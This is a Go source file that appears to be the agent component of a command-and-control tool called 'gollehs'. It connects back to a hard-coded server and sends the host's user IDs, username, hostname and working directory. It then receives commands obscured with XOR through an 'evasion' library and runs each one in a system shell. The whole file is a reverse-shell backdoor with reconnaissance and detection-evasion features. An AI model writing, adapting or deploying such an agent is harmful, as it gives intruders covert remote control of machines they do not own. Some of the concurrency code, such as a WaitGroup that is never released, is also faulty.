package main

import (
	"bufio"
	"encoding/gob"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/s-christian/gollehs/lib/evasion"
	"github.com/s-christian/gollehs/lib/logger"
	"github.com/s-christian/gollehs/lib/utils"
	"github.com/s-christian/gollehs/types"
	//"github.com/google/uuid"
)

const (
	serverPort = "8000"

	ExitSuccess int = 0
)

var (
	serverIp, _  = net.ResolveIPAddr("ip4", "127.0.0.1")
	serverTcp, _ = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%s", serverIp.IP.String(), serverPort))

	statusError   = color.New(color.BgRed, color.FgWhite, color.Bold, color.BlinkSlow)
	statusWarning = color.New(color.BgYellow, color.Bold)
	statusInfo    = color.New(color.FgCyan, color.Italic)
	statusProcess = color.New(color.FgBlue)
	statusDone    = color.New(color.FgGreen, color.Bold)
)

func main() {
	statusInfo.Printf("Agent connecting to %s\n", serverTcp.String())

	conn, err := net.DialTCP("tcp", nil, serverTcp)
	if err != nil {
		statusError.Printf("Couldn't connect to server! - %s\n", err.Error())
		return
	}

	defer func() {
		utils.Close(conn)
		statusWarning.Printf("Connection to %s closed\n", conn.RemoteAddr().String())
	}()

	statusProcess.Println("Connection established, sending environment information to server")

	// Populate AgentCallback struct with system and user data
	agentCallback := &types.AgentCallback{
		UID:             "-1",
		GID:             "-1",
		Username:        "<user>",
		Name:            "<name>",
		Hostname:        "<hostname>",
		Cwd:             "<cwd>",
		Output:          "",
		ExitCode:        ExitSuccess,
		LastInteraction: time.Now().Format(time.RFC3339),
	}

	currentUser, err := user.Current()
	if err != nil {
		logger.Log(logger.Error, "Cannot get current user information")
		logger.LogError(err)
	} else {
		agentCallback.UID = currentUser.Uid
		agentCallback.GID = currentUser.Gid
		/* --- GroupIds() requires cgo, requiring dynamic linking to GLIBC. Not as portable.
		groupIDs, err := currentUser.GroupIds()
		if err != nil {
			logger.Log(logger.Error, "Cannot retrieve groups IDs")
			logger.LogError(err)
		} else {
			agentCallback.GIDs = groupIDs
		}
		*/
		agentCallback.Username = currentUser.Username
		agentCallback.Name = currentUser.Name
	}

	hostname, err := os.Hostname()
	if err != nil {
		logger.Log(logger.Error, "Could not retrieve hostname")
		logger.LogError(err)
	} else {
		agentCallback.Hostname = hostname
	}

	cwd, err := os.Getwd()
	if err != nil {
		logger.Log(logger.Error, "Could not retrieve current working directory")
		logger.LogError(err)
	} else {
		agentCallback.Cwd = cwd
	}

	// Encode and send agent info
	encoder := gob.NewEncoder(conn)
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	err = encoder.Encode(agentCallback)
	if err != nil {
		statusWarning.Printf("WARNING: Could not send agent data | %s\n", err.Error())
	}

	statusDone.Println("Awaiting commands...")

	for {
		dataBuffer := make([]byte, 1024)

		numBytes, err := conn.Read(dataBuffer)
		if err != nil {
			if !errors.Is(err, io.EOF) {
				statusError.Printf("No data read from %s, closing\n", conn.RemoteAddr().String())
				logger.LogError(err)
			}
			return
		}

		// Shouldn't ever technically be greater than, but adding just in case
		if numBytes >= len(dataBuffer) {
			statusWarning.Println("Buffer is at maximum capacity, expect data to have been lost in transmission")
		}

		decryptedCommand := string(evasion.XorEncryptDecryptBytes(dataBuffer[:numBytes]))

		logger.Logf(logger.Debug, "Command is: '%s'\n", string(decryptedCommand))

		// Execute the command
		shell, shellArgs := GetShellName()

		outputc := make(chan []byte, 1024)
		processc := make(chan *os.ProcessState, 1)
		errc := make(chan error, 1)
		timer := time.NewTimer(10 * time.Second)
		go RunCommand(shell, shellArgs, decryptedCommand, outputc, processc, errc)

		for {
			select {
			case output := <-outputc:
				logger.Log(logger.Info, "Output is:")
				fmt.Println(string(output))
			case process := <-processc:
				logger.Log(logger.Info, "Process information:")
				fmt.Printf("Exit code | %d\nPID       | %d\nString    | %s\n", process.ExitCode(), process.Pid(), process.String())
				break
			case err = <-errc:
				logger.Log(logger.Error, "ERROR WHEN EXECUTING COMMAND")
				logger.LogError(err)
				break
			case timeout := <-timer.C:
				logger.Log(logger.Warning, "Timed out after", timeout.String())
				break
			}

			break
		}

		// Stop the timer, if still running
		if !timer.Stop() {
			<-timer.C
		}

		statusDone.Println("Done with connection! Everything worked!!!")
	}
}

func RunCommand(shell, shellArgs, command string, outputc chan<- []byte, processc chan<- *os.ProcessState, errc chan<- error) {
	cmd := exec.Command(shell, shellArgs, command)

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		errc <- err
		return
	}
	cmd.Stderr = cmd.Stdout

	scanner := bufio.NewScanner(stdout)
	err = cmd.Start()
	if err != nil {
		errc <- err
		return
	}

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		for scanner.Scan() {
			outputc <- scanner.Bytes()
		}
		close(outputc)
	}()
	wg.Wait()

	err = cmd.Wait()
	if err != nil {
		errc <- err
		return
	}
	close(errc)

	processc <- cmd.ProcessState
	close(processc)
}
